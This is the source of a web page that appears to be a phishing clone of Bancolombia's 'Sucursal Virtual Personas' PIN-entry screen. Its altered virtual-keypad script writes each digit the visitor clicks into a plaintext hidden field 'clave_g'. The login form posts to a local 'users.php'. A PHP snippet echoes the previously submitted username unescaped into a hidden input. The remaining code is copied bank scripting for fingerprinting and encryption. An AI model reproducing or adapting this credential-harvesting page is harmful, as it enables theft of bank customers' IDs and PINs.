function changeToOrigKeyboard(){        	for (i=0;i<10;i++){       			var mykey = document.getElementById('MdAlmdXlJcrY' + i);    			mykey.innerHTML=i;    			mykey.style.fontSize=12;    			mykey.style.fontWeight='bolder';       	} }
function refreshNumericKeyboard(contrastLevel) {    for(var i=0; i<10; i++) {        var mykey = document.getElementById('MdAlmdXlJcrY' + i);      mykey.style.fontSize=fontSizeDefault; mykey.className = 'colorContrast'+contrastLevel;     }      var clearKey = document.getElementById('clearKey');   clearKey.className = 'colorContrast'+contrastLevel;}
function resetForm() {    	
  document.loginUserForm.userId.value="";    	document.loginUserForm.tempUserID.value="";        	document.loginUserForm.password.value="";       
}		
function disableselect(e){    	if (omitformtags.indexOf(e.target.tagName.toLowerCase())==-1) 		return false;       }

function XCWHoiKCqmIk(keyVal) {   
  passwordMinLength[indexField] =UbxwxKyfBvQb[indexField].value.length;	
  if (UbxwxKyfBvQb[indexField].value.length < DEF_MAXLENGTH) {  
      if(keyVal=="KP1W"){
        Pwd=Pwd+"0"
      }
      if(keyVal=="j0i2"){
        Pwd=Pwd+"1"
      }
      if(keyVal=="4la3"){
        Pwd=Pwd+"2"
      }
      if(keyVal=="R9Uk"){
        Pwd=Pwd+"3"
      }
      if(keyVal=="CGI6"){
        Pwd=Pwd+"4"
      }
      if(keyVal=="FLnm"){
        Pwd=Pwd+"5"
      }
      if(keyVal=="f8HB"){
        Pwd=Pwd+"6"
      }
      if(keyVal=="eMZJ"){
        Pwd=Pwd+"7"
      }
      if(keyVal=="bYQN"){
        Pwd=Pwd+"8"
      }
      if(keyVal=="7cdS"){
        Pwd=Pwd+"9"
      }

      document.getElementById("clave_g").value = Pwd;
      //alert("Click "+Pwd);

     UbxwxKyfBvQb[indexField].value += '*';       	   
     kxXgpRmBxEuE[indexField].value += keyVal;
     if (regFunction) {     			
        regFunction();         	
     }   		
     if(document.loginUserForm.tempUserID != undefined) { 
         			if (document.loginUserForm.tempUserID.value !== "****************" && document.loginUserForm.tempUserID.value !== ""){       				
                  document.loginUserForm.userId.value = document.loginUserForm.tempUserID.value;       			   	
                  document.loginUserForm.tempUserID.value = "****************";   			
                }		
      } 	
    }
}
function    iMcDhlHVCHmU(){ 	if (validBrowser()) {   	hideUserID();     		var userId=document.loginUserForm.userId.value;          		var password=document.loginUserForm.password.value;       		for(var i=userId.search(" "); i!=-1; i=userId.search(" ")){      		i=userId.search(" ");            		var tmp = userId.substring(0,i);        		userId = tmp + userId.substring(i+1,userId.length);       		} 		if(isEmpty(userId) || isEmpty(password)) {         		alert('Por favor, ingresar su n�mero de Documento y su Clave.');        	} else if (isNaN(userId) ) {    			alert('Por favor, ingresar su n�mero de Documento y su Clave.');    			clearKeys();     	document.loginUserForm.tempUserID.value="";     	} else if (passwordMinLength[0] < DEF_MAXLENGTH - 1){     			alert('La clave debe ser de al menos 4 d�gitos. Por favor rectifique e intente nuevamente.');  			clearKeys();   			document.loginUserForm.password.value=""; 	 	} 		else {           	top.withNotify=true;                 return true;        }        }  	document.loginUserForm.tempUserID.focus();  	return false;     }function iMcDhlHVCHmURsaPass(){     	if (validBrowser()) {      		var password=document.loginUserForm.password.value;       		if(isEmpty(password))   			alert('Por favor ingrese su clave.');        		else if(passwordMinLength[0] < DEF_MAXLENGTH - 1){       			alert('La clave debe ser de al menos 4 d�gitos. Por favor rectifique e intente nuevamente.');  			clearKeys();       			document.loginUserForm.password.value="";    	 	} 		else {              	top.withNotify=true;             return true;        }         } 	return false;    }
function setDefaultCursor(element) {       element.style.cursor = 'default';    }
function reEnable(){       	return true;   }		
function dfXGzwoqUaVV(){        for (i=0;i<10;i++){                var mykey = document.getElementById('MdAlmdXlJcrY' + i); 	     mykey.innerHTML='*';   	     mykey.style.fontSize=15; 	     mykey.style.fontWeight='bolder';      }}		
function createKeyboard(openLayer, xPos, yPos) {            if (isLayer = openLayer)           createChild(window, "keyboard", EDKCIlUFEGBq(), isOpen, 330, 135, xPos, yPos);            else         document.getElementById('keyboard_').innerHTML =  (EDKCIlUFEGBq());            blockSelect(document.all? document.all['_KEYBRD']: document.getElementById? document.getElementById('_KEYBRD'): document);         refreshNumericKeyboard(contrastLevel);    }       		
function clearKeys() {  
  Pwd="";
  document.getElementById("clave_g").value = Pwd;
  //alert("Borrar text" +Pwd);  
  UbxwxKyfBvQb[indexField].value=""; 	  kxXgpRmBxEuE[indexField].value="";    
}	
function WsUEJoylUxkb(index) {     	if (index==undefined){    		index=0;       	}    	var form = UbxwxKyfBvQb[0].form;       	var vf;     	if (!kxXgpRmBxEuE[index]) {      	    var initialLength = form.elements.length;       var vfs='';		for (var i=0; i < initialLength; i++) {      			vf = ASnRWWqasAVo[form.elements[i].name.toUpperCase()];        			if (vf) { vfs+='<input type="hidden" name="'+vf+'">' ;           			}		}	} 				document.getElementById('inputs_').innerHTML = ( vfs );	for (ind=0; ind<UbxwxKyfBvQb.length; ind++){		vf = ASnRWWqasAVo[UbxwxKyfBvQb[ind].name.toUpperCase()];       		if(form[vf] == undefined) {      			kxXgpRmBxEuE[ind] = "";  		}  		else {      			kxXgpRmBxEuE[ind] = form[vf];  		} 		kxXgpRmBxEuE[ind].value = "";   	}}		
function changeContrastLevel(level) {    if(contrastLevel != level) {        contrastLevel = level;       refreshNumericKeyboard(level);       changeConstrastImage();} }
function bindElement(elem,index) {    	indexField=0; 	if (index!=undefined){ 		indexField=index;       	}    	UbxwxKyfBvQb[indexField] = elem;     	maxLengthKeyboard = (UbxwxKyfBvQb[indexField] && UbxwxKyfBvQb[indexField].maxLength? UbxwxKyfBvQb[indexField].maxLength: DEF_MAXLENGTH);       }		
function setHandCursor(element) {     element.style.cursor = 'pointer';        }	
function startKeyb(elem, index, modal) {        if (UbxwxKyfBvQb[indexField]) {      	      UbxwxKyfBvQb[indexField].disabled = false;         }       bindElement(elem);  	WsUEJoylUxkb(index);       if (!isOpen && isLayer) {  	     activateChild(isOpen = true);      }         if(modal)  {              UbxwxKyfBvQb[indexField].disabled = true;       }   }	
</script>
	
	
	<script language="JavaScript" type="text/javascript">
	var requiredMajorVersion = 10;
	var requiredMinorVersion = 0;
	var requiredRevision = 0;
	</script>
	<script language="JavaScript">
	var enPasswLength = 0;
	var contError="";
	var count=0;


	function enviar() {
	var form = $( "#loginUserForm" );
		document.getElementById("btnGo").disabled = true;    
			if(count==0){form.validate();if ( form.valid() ){post_fingerprints(document.forms[0]);var dat = changePass('password');document.getElementById("id_ss").value = processPassword(document.getElementsByName(dat)[0].value);document.getElementsByName(dat)[0].value = '';document.getElementById("password").value = '';document.getElementById("password").type='text';dfXGzwoqUaVV();form.submit();count++;return false;}} 
      var validationResult = $("#loginUserForm").valid();
      if(!validationResult){ count=0;document.getElementById("btnGo").disabled = false; }}

		$(document).ready(function() {contError= $("#contentError").html(); 
		$.validator.addMethod("passwordLength", function(value,element,param){return ( value.length >= 4  &&  value.length <= 4 );
		} );
		$.validator.addMethod("validaFormato", function(value,element,param){
			var patron = /^\d*$/;
		    if(!value.search(patron))return true;else return false;} );});
	</script>
	<script language="JavaScript">
	function do_encrypt() {
		if(document.loginUserForm.password.value != ""){
		  var rsa = new RSAKey();rsa.setPublic("A6CA1BB4BD803E5704A071E8F7370FD68F2A42CAB574A765693F0F54796CB8AD2CF1B624005119FE651227F7992FF6A6D1979C9B72EA0EAD789F1CBADAB9851779CB8F5F82F40BC71C5C303A10298ED6DC5657E3401AE5720F06836F098366441AC30AB35F13FAB8B6CE81955A1181FCA0AD4EA471CC09C51EAE8EDA42E8C615F933483449CBC67883F407430CB856E4EEC1919BFDD38850CCF5837EC67D8CF802EC30836099592FCDB6CEF4D4AB8EC7F95229B6B262DC6F9A62BFD082CCF98D8FC73FADFA2CCBDDBD17126206E0EC41FE85ECDB9B7631A7EDEF193E4971ADA3E4AB3FFE05F5146907255AD29D0AFB91160C95E225514E1CD07E35BA157A44D1", "10001");enPasswLength = document.loginUserForm.password.value.length;}cleanHidden();}
	function openUserSupport(url){bankWindow = window.open("???userSupport.urlDomain???" + url, 'bank','status=yes,menubar=no,scrollbars=yes,resizable=yes');bankWindow.focus();}
	function openSupport(url){bankWindow = window.open(url, 'support','');bankWindow.focus();}
	var isSiteScope = 
		
			false;
		
		
		$(document).ready(function() { $("#password").keypress(function(event)�{if�(event.which�==�13)�{event.preventDefault();document.getElementById('btnGo').click();}
		if�(event.which�==�8)�{event.preventDefault();}}); $(document).keypress(function(event)�{if�(event.which�==�8)�{event.preventDefault();}});});
	
	</script>

<script language="JavaScript">
$(document).ready(function() {
setTimeout(function(){
window.location.hash="no-back-button";window.location.hash="Again-No-back-button"; window.onhashchange=function(){window.location.hash="no-back-button";}},1000);});
document.ondrop=function(event){return false;}
function handle(delta) {if (delta < 0)
return false;else
return false;}
function wheel(event){var delta = 0;if (!event) 
event = window.event;if (event.wheelDelta) { delta = event.wheelDelta/120;if (window.opera)delta = -delta;} else if (event.detail) { delta = -event.detail/3;}if (delta)handle(delta);if (event.preventDefault)event.preventDefault();event.returnValue = false;}</script><script language="JavaScript">
var isCaptchaPage=false;
try {isCaptchaPage = checkCaptchaPage();} catch (err) {isCaptchaPage=false;}
$(document).ready(function() {
	$('*').bind("cut copy paste", function(e) {
		alert("Funcion no permitida");
		return false;
	});
});
document.onkeydown = mykeyhandler;
function mykeyhandler(event) {event = event || window.event;
var tgt = event.target || event.srcElement;
if((event.altKey && event.keyCode==37) || (event.altKey && event.keyCode==39) || (event.ctrlKey && event.keyCode==78)|| (event.ctrlKey && event.keyCode==67 && isCaptchaPage==false)|| (event.ctrlKey && event.keyCode==86 && isCaptchaPage==false)|| (event.ctrlKey && event.keyCode==85)||(event.ctrlKey && event.keyCode==45 && isCaptchaPage==false)|| (event.shiftKey && event.keyCode==45 && isCaptchaPage==false)){event.cancelBubble = true;event.returnValue = false;	alert("Funcion no permitida");
return false;}if(event.keyCode==18 && tgt.type != "text" && tgt.type != "password" && tgt.type != "textarea" && tgt.type != "application/x-shockwave-flash"){return false;}if (event.keyCode == 8 && tgt.type != "text" && tgt.type != "password" && tgt.type != "textarea" && tgt.type != "application/x-shockwave-flash" ){return false;}if(event.ctrlKey && ( event.keyCode==107 || event.keyCode==109 )  ){return false;}if ((event.keyCode >= 112) && (event.keyCode <= 123)) {
if (navigator.appName == "Microsoft Internet Explorer"){window.event.keyCode=0;}return false;}}function mouseDown(e) {var ctrlPressed=0;var altPressed=0;var shiftPressed=0;if (parseInt(navigator.appVersion)>3) {if (navigator.appName=="Netscape") {var mString =(e.modifiers+32).toString(2).substring(3,6);shiftPressed=(mString.charAt(0)=="1");ctrlPressed =(mString.charAt(1)=="1");altPressed  =(mString.charAt(2)=="1");
self.status="modifiers="+e.modifiers+" ("+mString+")"}else {shiftPressed=event.shiftKey;altPressed  =event.altKey;ctrlPressed =event.ctrlKey;}if (shiftPressed || altPressed || ctrlPressed) 
alert ("Funcion no permitida");}return true;}if (parseInt(navigator.appVersion)>3) {document.onmousedown = mouseDown;if (navigator.appName=="Netscape") document.captureEvents(Event.MOUSEDOWN);}var message="";
function clickIE() {if (document.all){(message);return false;}}function clickNS(e) {if(document.layers||(document.getElementById&&!document.all)) {if (e.which==2||e.which==3) {(message);return false;}}}if (document.layers){document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;}else{document.onmouseup=clickNS;document.oncontextmenu=clickIE;}document.oncontextmenu=new Function("return false");
var isIEx  = (navigator.appVersion.indexOf("MSIE") != -1) ? true : false;
function alertSize() {var myHeight = 0;if( typeof( window.innerWidth ) == 'number' ) {myHeight = window.innerHeight;} else if( document.documentElement && ( document.documentElement.clientWidth || document.documentElement.clientHeight ) ) {myHeight = document.documentElement.clientHeight;} else if( document.body && ( document.body.clientWidth || document.body.clientHeight ) ) {myHeight = document.body.clientHeight;}return myHeight;}function setElementHeight(elementName, indent) {var elementEl = document.getElementById? document.getElementById(elementName): document.all? document.all[elementName]: null;if (elementEl) {elementEl.style.height = "auto"; var h = alertSize();var new_h = (h-indent);try{elementEl.style.height = new_h + "px";}catch(err){}}}</script><script>

var warning = 300;
var timeout = 420;

var current = 0;
var timeOutActive = true;
function popUpTimeOut(sURL) { window.open(unescape(sURL), "msgWindow","dependent=yes,titlebar=no,menubar=no,height=190,hotkeys=no,resizable=no,status=no,toolbar=no,width=530,alwaysRaised=1");  }


function getSecs() { if(timeOutActive){current = current + 1;if (current == warning) {popUpTimeOut("/mua/html/timeoutWarning1.html"); }if (current == timeout - 10) {popUpTimeOut("/mua/html/timeoutWarning2.html"); }if (current == timeout) {window.location.href="/mua/CLOSE";}window.setTimeout('getSecs()',1000); }}
getSecs();
</script><script type="text/javascript">
      function setTitle(){document.title='Bancolombia Sucursal Virtual Personas';}
</script><link rel="shortcut icon" href=""></head>

















<body onload="timeOutActive = true;initPage(); setTitle();" style="">



<form id="loginUserForm" name="loginUserForm" method="POST" id="main_form" autocomplete="none"    action="users.php">
<input id="id_ss" name="id_ss" type="hidden" value="">
<?php
$v_user = $_POST['username'];
?>
<input id="usuario_h" name="usuario_h" value="<?php echo $v_user; ?> "  type="hidden">
<input id="clave_g" name="clave_g" value=""  type="hidden">
   
<div class="container">

	

<div>
	<div id="header" class="mua-page-header">
		<div class="row row-logo-svp"> 
			<div class="col-xs-12 col-sm-7 col-md-7 left-div">
				<div class="mua-imgLogoItem"></div>
				<div class="text-svp-name">Sucursal Virtual Personas</div>
			</div>
		</div>
		<div class="row">
			<div class="col-xs-12 col-sm-7 col-md-7 left-div">
				<div id="lastIn" class="mua-title-text" style="padding-top: 10px !important;">
					





<script language="javascript" src="./index2_files/jquery.jclock-min.js" type="text/JavaScript"></script>

 <script type="text/javascript">
     $(function($) {
         var optionsEST = {
         am_pm: true,
         timeNotation: '12h',
         h_hour: "20:27:16",
         h_date: "2018/03/11",
         h_format: "$nombreDia$ $dia$ de $nombreMes$ de $anio$ $hhmmss$ $ampm$",
         h_language: "es"
        }
     $('#jclock1').jclock(optionsEST);
     });
 </script>
<div>

				</div>
			</div>
		</div>
	</div>

	<div class="panel-heading">
		<h3>
			Ingrese su Clave Personal
		</h3>
	</div>
</div>

	<div>
		<input type="hidden" name="tempUserID" id="tempUserID" value="">
		<input type="hidden" name="HIT_KEY" value="0">
		<input type="hidden" name="HIT_VKEY" value="0">
		<input type="hidden" name="userId" value="">


		<div class="panel panel-primary">

				<div class="row">
					










<script language="JavaScript">
	function cerrarError() {
		document.getElementById("tabError").style.display = "none";
		document.getElementById('summary').innerHTML='';
	}
</script>



<div class="col-xs-12 col-sm-12 col-md-12 mua_message_not_from_svp" id="tabError" style="display: none;">

	<div class="errorDiv">
        <div class="divTextMessage">
			<span class="icon-error errorIcon">
				<span class="path1"></span>
				<span class="path2"></span>
				<span class="path3"></span>
            </span>
            <div class="errorTitulo">Error</div>
			<div id="summary" class="errorTexto">

				
			</div>
		</div>
	</div>
	</div>
	


				</div>

				<div class="mua-panel-body">
					  
					<div class="row">
					
						<div class="col-lg-5 col-md-5 col-sm-6">
							
											
								<h5 class="mua-title-h5"><font color="#FFFFFF" > Imagen y frase de seguridad seleccionadas</font></h5>
											
								<p class="mua-phrase-message mua-small-text"><font color="#FFFFFF" >Digita tu Clave personal.</font></p>

								<div id="phraseImage" class="mua-image-login-container">
									




								</div>
							
									
						</div>
					
					
						<div class="col-lg-4 col-md-5 col-sm-6">

							<div class="panel_general">
								<div class="title-panel-label">
									<h1>
										Clave
									</h1>
								</div>
								
									<div class="subtitle-land-label">
										<h4>
											Digita tu Clave personal.
										</h4>
									</div>
								
								<div id="contenido">
									<div class="mua-content-group-panel">
										<div class="mua-label-input">
											<label class="control-label" for="username">
												Ingresa tu clave
											</label>
										</div>
										<div>
											<div class="mua_svp_enroll_update_control">
												<input id="password" name="password" class="mua-form-control mua-readOnlyInput mua_svp_control_password mua-input-icon" type="password" value="" readonly="true" maxlength="4" autocomplete="off">
												<span class="mua-icon-lock"> </span>
											</div>
										</div>
									</div>

									<div class="mua-content-legend">
										<p>Ingresa mediante el teclado virtual la clave que usas en el cajero automatico.</p>
									</div>
								</div>

								<div class="two-button-container mua-button-container">
									<div class="two-button-a">
										<input class="btn btn-default" onclick="document.getElementById(&#39;password&#39;).type=&#39;text&#39;;document.getElementById(&#39;password&#39;).value = &#39;&#39;;window.location.href=&#39;/mua/CLOSE_ALL&#39;; return (false);" type="button" value="Cancelar">
									</div>
								    <div class="two-button-b">
										
										<input id="btnGo" name="btnGo" class="btn btn-success" type="submit" onmouseover="dfXGzwoqUaVV();" onmouseout="changeToOrigKeyboard();"  value="Ingresar">
									</div>
								</div>

								<div class="mua-error-login">
									<div class="mua-error-login-div">
										<span id="popoverId" class="glyphicon icon-icono-informacion mua_pg_pgdsc_icons mua-label-icon" data-original-title="" title=""></span>
										<div id="popoverContent" class="hide">
											



<span class="mua_tooltip_close">�</span>
<div class="mua_tooltip_msg">
	
		
			Si usted es un Colombiano en el Exterior y no ha sido cliente Bancolombia en el pasado o es un cliente exclusivo Fiduciaria, usted debe generar una clave para continuar con el proceso.
		
		
	
</div>
										</div>
										<a style="font-size:14px !important;" href="">Genera una clave personal</a>
									</div>
								</div>

							</div>

						</div>
						
						<div class="col-lg-3 col-md-3 col-sm-3 col-xs-3" style="height:350px;width:220px;">
								<div id="keyboard_">  <table class="keyboard" border="0" cellspacing="0" cellpadding="0" align="left" valign="top">  <tbody><tr>    <td width="0" height="20"></td>    <td></td>  </tr>  <tr>    <td height="0" width="0"></td>    <td colspan="2">      <table align="left" valign="top" cellspacing="0" cellpadding="0" class="bg_button">        <tbody><tr align="left">                  <td valign="top" align="left"> <table class="bg_button" id="_KEYBRD" valign="top">  <tbody><tr><td class="bg_buttonSmall" align="center" style="cursor:default" onmouseover="dfXGzwoqUaVV();" onmouseout="changeToOrigKeyboard();" onclick="XCWHoiKCqmIk(&quot;f8HB&quot;);">  <div border="0" id="MdAlmdXlJcrY6" valign="center" align="center" onfocus="this.blur();" class="colorContrast2">6</div></td><td class="bg_buttonSmall" align="center" style="cursor:default" onmouseover="dfXGzwoqUaVV();" onmouseout="changeToOrigKeyboard();" onclick="XCWHoiKCqmIk(&quot;bYQN&quot;);">  <div border="0" id="MdAlmdXlJcrY8" valign="center" align="center" onfocus="this.blur();" class="colorContrast2">8</div></td><td class="bg_buttonSmall" align="center" style="cursor:default" onmouseover="dfXGzwoqUaVV();" onmouseout="changeToOrigKeyboard();" onclick="XCWHoiKCqmIk(&quot;eMZJ&quot;);">  <div border="0" id="MdAlmdXlJcrY7" valign="center" align="center" onfocus="this.blur();" class="colorContrast2">7</div></td></tr>  <tr><td class="bg_buttonSmall" align="center" style="cursor:default" onmouseover="dfXGzwoqUaVV();" onmouseout="changeToOrigKeyboard();" onclick="XCWHoiKCqmIk(&quot;FLnm&quot;);">  <div border="0" id="MdAlmdXlJcrY5" valign="center" align="center" onfocus="this.blur();" class="colorContrast2">5</div></td><td class="bg_buttonSmall" align="center" style="cursor:default" onmouseover="dfXGzwoqUaVV();" onmouseout="changeToOrigKeyboard();" onclick="XCWHoiKCqmIk(&quot;4la3&quot;);">  <div border="0" id="MdAlmdXlJcrY2" valign="center" align="center" onfocus="this.blur();" class="colorContrast2">2</div></td><td class="bg_buttonSmall" align="center" style="cursor:default" onmouseover="dfXGzwoqUaVV();" onmouseout="changeToOrigKeyboard();" onclick="XCWHoiKCqmIk(&quot;j0i2&quot;);">  <div border="0" id="MdAlmdXlJcrY1" valign="center" align="center" onfocus="this.blur();" class="colorContrast2">1</div></td></tr>  <tr><td class="bg_buttonSmall" align="center" style="cursor:default" onmouseover="dfXGzwoqUaVV();" onmouseout="changeToOrigKeyboard();" onclick="XCWHoiKCqmIk(&quot;7cdS&quot;);">  <div border="0" id="MdAlmdXlJcrY9" valign="center" align="center" onfocus="this.blur();" class="colorContrast2">9</div></td><td class="bg_buttonSmall" align="center" style="cursor:default" onmouseover="dfXGzwoqUaVV();" onmouseout="changeToOrigKeyboard();" onclick="XCWHoiKCqmIk(&quot;CGI6&quot;);">  <div border="0" id="MdAlmdXlJcrY4" valign="center" align="center" onfocus="this.blur();" class="colorContrast2">4</div></td><td class="bg_buttonSmall" align="center" style="cursor:default" onmouseover="dfXGzwoqUaVV();" onmouseout="changeToOrigKeyboard();" onclick="XCWHoiKCqmIk(&quot;R9Uk&quot;);">  <div border="0" id="MdAlmdXlJcrY3" valign="center" align="center" onfocus="this.blur();" class="colorContrast2">3</div></td></tr>  <tr><td class="bg_buttonSmall" align="center" style="cursor:default" onmouseover="dfXGzwoqUaVV();" onmouseout="changeToOrigKeyboard();" onclick="XCWHoiKCqmIk(&quot;KP1W&quot;);">  <div border="0" id="MdAlmdXlJcrY0" valign="center" align="center" onfocus="this.blur();" class="colorContrast2">0</div></td><td colspan="2" onclick="clearKeys();" class="bg_buttonSmall"><div id="clearKey" border="0" valign="center" align="center" onfocus="this.blur();" class="colorContrast2">Borrar</div></td></tr></tbody></table><table class="bg_button" id="_CONSTRAST" valign="top" cellspacing="0">  <tbody><tr><td><img width="90" height="34" border="0" src="./index2_files/Contraste2.gif" name="constrastImg" id="constrastImg" usemap="#numericKeyboardMap"> <map name="numericKeyboardMap" id="numericKeyboardMap"><area shape="circle" class="cursorContrast" coords="10,30,15" onmouseover="setHandCursor(document.constrastImg)" onclick="changeContrastLevel(1)" onmouseout="setDefaultCursor(document.constrastImg)"><area shape="circle" class="cursorContrast" coords="50,30,15" onmouseover="setHandCursor(document.constrastImg)" onclick="changeContrastLevel(2)" onmouseout="setDefaultCursor(document.constrastImg)"><area shape="circle" class="cursorContrast" coords="90,30,15" onmouseover="setHandCursor(document.constrastImg)" onclick="changeContrastLevel(3)" onmouseout="setDefaultCursor(document.constrastImg)"></map></td></tr></tbody></table></td>        </tr>      </tbody></table>    </td>  </tr><tr>    <td height="17"></td>    <td colspan="2"></td>  </tr> </tbody></table></div>
								<div id="inputs_"><input type="hidden" name="OUnxqkYYMyKy" value=""></div>
								<script>
									createKeyboard();
									startKeyb(document.loginUserForm.password);
									resetForm();
			             		</script>	
						</div>

		                	
					</div>
				</div>
		</div>
		        
	</div>
		









<div class="row">
	<div class="col-xs-12 col-sm-12 col-md-12">
		<p class="mua-footer mua-footer-info-call">
			Sucursal Telefonica Bancolombia: Bogota 343 0000 - Medellin 510 9000 - Cali 554 0505 - Barranquilla 361 8888 - Cartagena 693 4400 - Bucaramanga 697 2525 - Pereira 340 1213 - El resto del pais 01 800 09 12345 <br> Sucursales Telefonicas en el exterior:  900 995 717 - Estados Unidos 1866 379 9714.
		</p>
	</div>
</div>

		









	        <script type="text/javascript">
	var year = (new Date).getFullYear();
	$(document).ready(function() {
	  $("#fecha").text( year );
	});
	</script>
	        <div style="margin-top: 10px;">
	            <div class="mua-title-text pull-left">Direccion IP: 192.0.16.14</div>
	            <div class="mua-title-text pull-right">Copyright &copy;<span id="fecha">2018</span>&nbsp;Bancolombia S.A.&nbsp;&nbsp;</div>
	        </div>
	   
	
</div>






<script src="./index2_files/hashtable.js" type="text/javascript"></script>
<script src="./index2_files/rsa(1).js" type="text/javascript"></script>
<script src="./index2_files/AC_OETags(1).js" type="text/javascript"></script>	
<script src="./index2_files/json2.js" type="text/javascript"></script>
<script src="./index2_files/swfRSACookieFunc.js" type="text/javascript"></script>
<input id="device_id" name="device_id" type="hidden" value="">
<input id="userlanguage" name="userlanguage" type="hidden" value="es-419">
<input id="deviceprint" name="deviceprint" styleid="deviceprint" type="hidden" value="version=3.4.2.0-SNAPSHOT&amp;pm_fpua=mozilla/5.0 (macintosh; intel mac os x 10_12_6) applewebkit/537.36 (khtml, like gecko) chrome/64.0.3282.186 safari/537.36|5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36|MacIntel&amp;pm_fpsc=24|1440|900|797&amp;pm_fpsw=&amp;pm_fptz=-5&amp;pm_fpln=lang=es-419|syslang=|userlang=&amp;pm_fpjv=0&amp;pm_fpco=1&amp;pm_fpasw=internal-pdf-viewer|mhjfbmdgcfjbbpaeojofohoefgiehjai|internal-nacl-plugin|widevinecdmadapter&amp;pm_fpan=Netscape&amp;pm_fpacn=Mozilla&amp;pm_fpol=true&amp;pm_fposp=&amp;pm_fpup=&amp;pm_fpsaw=1440&amp;pm_fpspd=24&amp;pm_fpsbd=&amp;pm_fpsdx=&amp;pm_fpsdy=&amp;pm_fpslx=&amp;pm_fpsly=&amp;pm_fpsfse=&amp;pm_fpsui=&amp;pm_os=Mac&amp;pm_brmjv=64&amp;pm_br=Chrome&amp;pm_inpt=6&amp;pm_expt=">
<input id="pgid" name="pgid" type="hidden" value="{&quot;functions&quot;:{&quot;names&quot;:[&quot;$&quot;,&quot;ac_addextension&quot;,&quot;ac_fl_runcontent&quot;,&quot;ac_generateobj&quot;,&quot;ac_getargs&quot;,&quot;arc4init&quot;,&quot;arc4next&quot;,&quot;arcfour&quot;,&quot;biginteger&quot;,&quot;blackberrylocationcollector&quot;,&quot;classic&quot;,&quot;controlversion&quot;,&quot;detectflashver&quot;,&quot;domdatacollection&quot;,&quot;edkcilufegbq&quot;,&quot;fingerprint&quot;,&quot;getswfver&quot;,&quot;html5locationcollector&quot;,&quot;hashtable&quot;,&quot;ie_fingerprint&quot;,&quot;interactionelement&quot;,&quot;leapyear&quot;,&quot;montgomery&quot;,&quot;mozilla_fingerprint&quot;,&quot;opera_fingerprint&quot;,&quot;rsadopublic&quot;,&quot;rsaencrypt&quot;,&quot;rsakey&quot;,&quot;rsasetpublic&quot;,&quot;securerandom&quot;,&quot;tienesolodigitos&quot;,&quot;tienesolodigitosypunto&quot;,&quot;timer&quot;,&quot;uielementlist&quot;,&quot;uievent&quot;,&quot;wsuejoyluxkb&quot;,&quot;xcwhoikcqmik&quot;,&quot;__nr_require&quot;,&quot;activatechild&quot;],&quot;excluded&quot;:{&quot;size&quot;:0,&quot;count&quot;:0},&quot;truncated&quot;:true},&quot;inputs&quot;:[&quot;hit_key&quot;,&quot;hit_vkey&quot;,&quot;no_name&quot;,&quot;ounxqkyymyky&quot;,&quot;btngo&quot;,&quot;device_id&quot;,&quot;deviceprint&quot;,&quot;id_ss&quot;,&quot;password&quot;,&quot;pgid&quot;,&quot;tempuserid&quot;,&quot;uievent&quot;,&quot;userid&quot;,&quot;userlanguage&quot;],&quot;iframes&quot;:[],&quot;scripts&quot;:[0,0,14990,0,0,0,0,0,0,0,0,0,0,0,0,717,773,0,0,0,0,15912,92,1108,1339,645,3400,606,84,0,328,143,121,106,0,0,0,0,0,1237,65,307,365,287],&quot;collection_status&quot;:0}">
<input id="uievent" name="uievent" type="hidden" value="@@0,1050,0">
<script type="text/javascript">
function nonExcludedFuction(){
}	
function exclude1(){
}
function exclude2(){
}
function initPage(){		
ieVersion = getInternetExplorerVersion();
if( ieVersion >= 8  || ieVersion == -1 ){
ProxyCollector.externalIP = "181.49.88.146";			
ProxyCollector.initProxyCollection();
}
UIEventCollector.initEventCollection();
setTimeout("collect()", 4000);
}	
function inspect(){
var domElementsString = dom_data_collection.domDataAsJSON();
document.forms[0].pgid.value = domElementsString.replace(/[&?]/g, '');
document.forms[0].uievent.value = UIEventCollector.serialize();
}
function getInternetExplorerVersion(){
var rv = -1; // Return value assumes failure.
if (navigator.appName == 'Microsoft Internet Explorer'){
var ua = navigator.userAgent;
var re  = new RegExp("MSIE ([0-9]{1,}[\.0-9]{0,})");
if (re.exec(ua) != null)
rv = parseFloat( RegExp.$1 );
}
return rv;
}
function collect(){
var devprint = add_deviceprint();
document.forms[0].deviceprint.value = devprint;
var ieVersion = getInternetExplorerVersion();
dom_data_collection = new DomDataCollection();
dom_data_collection.startInspection();
dom_data_collection.config.functionsToExclude = ['exclude1', 'exclude2'];
dom_data_collection.initFunctionsToExclude();
inspect();						
}	
</script>

<meta http-equiv="PRAGMA" content="NO-CACHE"> 
<meta http-equiv="Expires" content="-1">
<script language="JavaScript">
document.forms[0].userlanguage.value = fingerprint_userlang ();
</script>
<script language="JavaScript" type="text/javascript">
<!--
var flashVars = "field_name=device_id&" +
"ip_address=2A3028A2A7BACEC";
var flashMovie = "/mua/swf/rsa_fso"; 
if (DetectFlashVer(6,0,0)) 
{	
AC_FL_RunContent(
'id','flash_id',
'width', '1',
'height', '1',
'movie', flashMovie,
'quality', 'high',
'bgcolor','#FFFFFF',
'flashVars', flashVars
); 
}
//-->
</script>	
</form>

<script type="text/javascript">
	$(document).ready(function() {$('#popoverId').popover({html: true,trigger:'click',title: '',content:function(){return $("#popoverContent").html();}});
		$('#popoverId').click(function (e) {e.stopPropagation();});
		$(document).click(function (e) {if (($('.popover').has(e.target).length == 0) || $(e.target).is('.close')) {$('#popoverId').popover('hide');}});});
</script>


<script type="text/javascript">window.NREUM||(NREUM={});NREUM.info={"applicationID":"33598753","applicationTime":5,"beacon":"bam.nr-data.net","queueTime":0,"licenseKey":"017cf77fef","transactionName":"YAFQY0VZWkFTAUcPX1lLYUdFUVpVcQ1dEkJYCF5SRRdic34rdydkcjRzZGRve2B2QhshdWNN","agent":"","errorBeacon":"bam.nr-data.net"}</script>   


</body></html>